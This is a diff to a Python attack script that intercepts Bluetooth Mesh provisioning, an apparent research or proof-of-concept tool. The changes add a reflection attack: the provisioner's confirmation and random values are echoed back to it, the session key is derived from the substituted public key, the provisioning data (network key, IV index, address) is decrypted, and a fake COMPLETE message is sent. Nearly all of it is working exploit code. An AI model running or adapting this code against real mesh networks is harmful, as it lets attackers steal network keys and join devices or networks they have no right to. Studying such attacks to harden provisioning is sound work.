@@ -82,32 +82,19 @@ def fake_prov(s_prov, data):
         logger.info(f"Sending attacker's public key to provisioner: {modified_data.hex()}")
         s_prov.send(modified_data)
 
-        # Build confirmation_inputs
-        if invite_pdu is not None and capabilities_pdu is not None and start_pdu is not None:
-            global confirmation_inputs
-            confirmation_inputs = (
-                    invite_pdu +
-                    capabilities_pdu +
-                    start_pdu +
-                    modified_data[1:] +  # Our public key
-                    data[1:]  # Device's public key
-            )
-            logger.info(f"Built confirmation inputs: {confirmation_inputs.hex()}")
-        else:
-            logger.warning("Not all PDUs available for confirmation_inputs")
         return
     elif data[0:1] == PROVISIONING_CONFIRMATION_OPCODE:
         # Store device's confirmation value
         device_confirmation = data[1:]
-        logger.info(f"Send device confirmation to provisioner: {device_confirmation.hex()}")
-        s_prov.send(data)
+        logger.info(f"store device confirmation: {device_confirmation.hex()}")
+        #s_prov.send(data)
         return
 
     elif data[0:1] == PROVISIONING_RANDOM_OPCODE:
         # Store device's random value
         device_random_value = data[1:]
-        logger.info(f"Send device random value to provisioner: {device_random_value.hex()}")
-        s_prov.send(data)
+        logger.info(f"Stored device random: {device_random_value.hex()}")
+        #s_prov.send(data)
         return
 
     elif data[0:1] == PROVISIONING_COMPLETE_OPCODE:
@@ -130,25 +117,30 @@ def fake_dev(s_dev, s_prov, data):
     global provisioner_random_value, invite_pdu, start_pdu, confirmation_inputs
     global attacker_private_key, attacker_public_key_x, attacker_public_key_y
 
+    device_connected = s_dev is not None
     logger.info(f'Intercepted provisioner->device: {data.hex()}')
     if  len(data) == 1 and data[0:1] == LINK_OPEN_OPCODE:
-        s_dev.send(data)
+        if device_connected:
+            s_dev.send(data)
         return
 
     elif data[0:1] == PROVISIONING_INVITE_OPCODE:
         # Store invite PDU for confirmation_inputs
         invite_pdu = data[1:]
-        s_dev.send(data)
+        if device_connected:
+            s_dev.send(data)
         return
 
     elif data[0:1] == PROVISIONING_START_OPCODE:
         # Store start PDU for confirmation_inputs
         start_pdu = data[1:]
-        s_dev.send(data)
+        if device_connected:
+            s_dev.send(data)
         return
 
     elif len(data) > 1 and data[0:1]  == PROVISIONING_PUBLIC_KEY_OPCODE:
         # Store provisioner's public key
+        provisioner_public_key = data[1:]
         provisioner_public_key_x = data[1:33]
         provisioner_public_key_y = data[33:]
 
@@ -160,47 +152,77 @@ def fake_dev(s_dev, s_prov, data):
         # Send our public key to device instead of provisioner's
         modified_data = PROVISIONING_PUBLIC_KEY_OPCODE + attacker_public_key_x + attacker_public_key_y
         logger.info(f"Sending attacker's public key to device: {modified_data.hex()}")
-        s_dev.send(modified_data)
+        if device_connected:
+            s_dev.send(modified_data)
+
+            # Build confirmation_inputs
+        if invite_pdu is not None and capabilities_pdu is not None and start_pdu is not None:
+            global confirmation_inputs
+            confirmation_inputs = (
+                    invite_pdu +
+                    capabilities_pdu +
+                    start_pdu +
+                    data[1:] +  # Original provisioner public key
+                    (attacker_public_key_x + attacker_public_key_y)  # Our public key sent to provisioner
+            )
+            logger.info(f"Built confirmation inputs: {confirmation_inputs.hex()}")
+        else:
+            logger.warning("Not all PDUs available for confirmation_inputs")
+
         return
 
     elif data[0:1] == PROVISIONING_CONFIRMATION_OPCODE:
         # Store provisioner's confirmation value
         provisioner_confirmation = data[1:]
-        logger.info(f"Send provisioner confirmation to device: {provisioner_confirmation.hex()}")
-        s_dev.send(data)
+        logger.info(f"send provisioner confirmation to device: {provisioner_confirmation.hex()}")
+        # Reflect the confirmation back to provisioner
+        if device_connected:
+            s_dev.send(data)
+        time.sleep(0.2)
+        logger.info(f"Reflecting provisioner confirmation: {provisioner_confirmation.hex()}")
+        s_prov.send(PROVISIONING_CONFIRMATION_OPCODE + provisioner_confirmation)
         return
 
     elif data[0:1] == PROVISIONING_RANDOM_OPCODE:
-        # Store provisioner's random value
         provisioner_random_value = data[1:]
-        logger.info(f"Send provisioner random value to device: {provisioner_random_value.hex()}")
-        s_dev.send(data)
+        logger.info(f"Reflecting provisioner random value: {provisioner_random_value.hex()}")
+        # Reflect random value back to provisioner
+        if device_connected:
+            s_dev.send(data)
+        time.sleep(0.2)
+        s_prov.send(PROVISIONING_RANDOM_OPCODE + provisioner_random_value)
         return
 
     elif data[0:1] == PROVISIONING_DATA_OPCODE:
         # Make sure we have all required data
+        """
         if None in [provisioner_public_key_x, device_public_key_x,
                     provisioner_random_value, device_random_value, confirmation_inputs]:
             logger.error("Missing required data for decryption")
             s_dev.send(data)
             return
+        """
             # Extract encrypted data and MIC
         encrypted_data = data[1:-8]  # Remove opcode and MIC
         mic = data[-8:]  # Last 8 bytes are MIC
 
         try:
             # Calculate the shared keys with both parties
-            dhkey_prov = derive_dhkey(attacker_private_key, provisioner_public_key_x, provisioner_public_key_y)
-            dhkey_dev = derive_dhkey(attacker_private_key, device_public_key_x, device_public_key_y)
+            dhkey = derive_dhkey(attacker_private_key, provisioner_public_key_x, provisioner_public_key_y)
+            logger.info(f'dhkey calculated {dhkey.hex()}')
+            #dhkey_prov = derive_dhkey(attacker_private_key, provisioner_public_key_x, provisioner_public_key_y)
+            #dhkey_dev = derive_dhkey(attacker_private_key, device_public_key_x, device_public_key_y)
 
             # Calculate salts
             confirmation_salt = s1(confirmation_inputs)
-            prov_salt = s1(confirmation_salt + provisioner_random_value + device_random_value)
-
+            logger.info(f"confirmation_salt :{confirmation_salt.hex()}")
+            prov_salt = s1(confirmation_salt + provisioner_random_value + provisioner_random_value)
+            logger.info(f"prov_salt:{prov_salt.hex()}")
             # Calculate session key for decryption
-            session_key = k1(dhkey_prov, prov_salt, b'prsk')
-            nonce = k1(dhkey_prov, prov_salt, b'prsn')[:13]
-
+            session_key = k1(dhkey, prov_salt, b'prsk')
+            logger.info(f"session_key:{session_key.hex()}")
+            nonce = k1(dhkey, prov_salt, b'prsn')[:13]
+            logger.info(f"nonce:{nonce.hex()}")
             # Decrypt the provisioning data
             cipher = AES.new(session_key, AES.MODE_CCM, nonce=nonce, mac_len=8)
             cipher.update(b'')
@@ -220,27 +242,29 @@ def fake_dev(s_dev, s_prov, data):
             logger.info(f"IV Index: {iv_index.hex()}")
             logger.info(f"Unicast Address: {unicast_address.hex()}")
 
-            # Re-encrypt the data for the device using our shared key
-            session_key_dev = k1(dhkey_dev, prov_salt, b'prsk')
-            nonce_dev = k1(dhkey_dev, prov_salt, b'prsn')[:13]
+            if device_connected:
+                s_dev.send(data)
 
-            cipher_dev = AES.new(session_key_dev, AES.MODE_CCM, nonce=nonce_dev, mac_len=8)
-            cipher_dev.update(b'')
-            encrypted_data_dev, mic_dev = cipher_dev.encrypt_and_digest(decrypted_data)
 
-            modified_data = PROVISIONING_DATA_OPCODE + encrypted_data_dev + mic_dev
-            s_dev.send(modified_data)
+            # Send fake COMPLETE opcode to provisioner
+            complete_message = PROVISIONING_COMPLETE_OPCODE
+            logger.info("Sending fake COMPLETE message to provisioner")
+            s_prov.send(complete_message)
+
             return
 
         except Exception as e:
             logger.error(f"Error processing provisioning data: {e}")
-            s_dev.send(data)
+            if device_connected:
+                s_dev.send(data)
             return
 
     elif data[0:1] == LINK_CLOSE_OPCODE:
-        s_dev.send(data)
+        if device_connected:
+            s_dev.send(data)
         return
-
+    if device_connected:
+        s_dev.send(data)
     s_dev.send(data)
 
 
@@ -258,15 +282,43 @@ def sniff():
 
     sockets = [dev_conn, prov_conn]
 
+    device_alive = True  # Flag to track device connection status
+
     while True:
-        readable, _, _ = select.select(sockets, [], [])
-        for s in readable:
-            if s == dev_conn:
-                data = dev_conn.recv()
-                fake_prov(prov_conn, data)
-            elif s == prov_conn:
-                data = prov_conn.recv()
-                fake_dev(dev_conn, s, data)
+        try:
+            readable, _, _ = select.select([prov_conn] + ([dev_conn] if device_alive else []), [], [], 1.0)
+            for s in readable:
+                if s == dev_conn and device_alive:
+                    try:
+                        data = dev_conn.recv()
+                        if not data:  # Connection closed
+                            raise EOFError("Device connection closed")
+                        fake_prov(prov_conn, data)
+                    except Exception as e:
+                        logger.info(f"Device connection issue: {e}")
+                        device_alive = False  # Mark device as disconnected
+                        # Remove device socket from select list
+                        sockets = [prov_conn]
+                        # Continue with provisioner connection
+                        continue
+
+                elif s == prov_conn:
+                    try:
+                        data = prov_conn.recv()
+                        if not data:  # Connection closed
+                            raise EOFError("Provisioner connection closed")
+                        if device_alive:
+                            fake_dev(dev_conn, s, data)
+                        else:
+                            # Device is disconnected, but we still process provisioner data
+                            fake_dev(None, s, data)
+                    except Exception as e:
+                        logger.error(f"Provisioner connection error: {e}")
+                        return  # Exit if provisioner connection fails
+
+        except Exception as e:
+            logger.error(f"Error in main loop: {e}")
+            break
 
 
 if __name__ == "__main__":
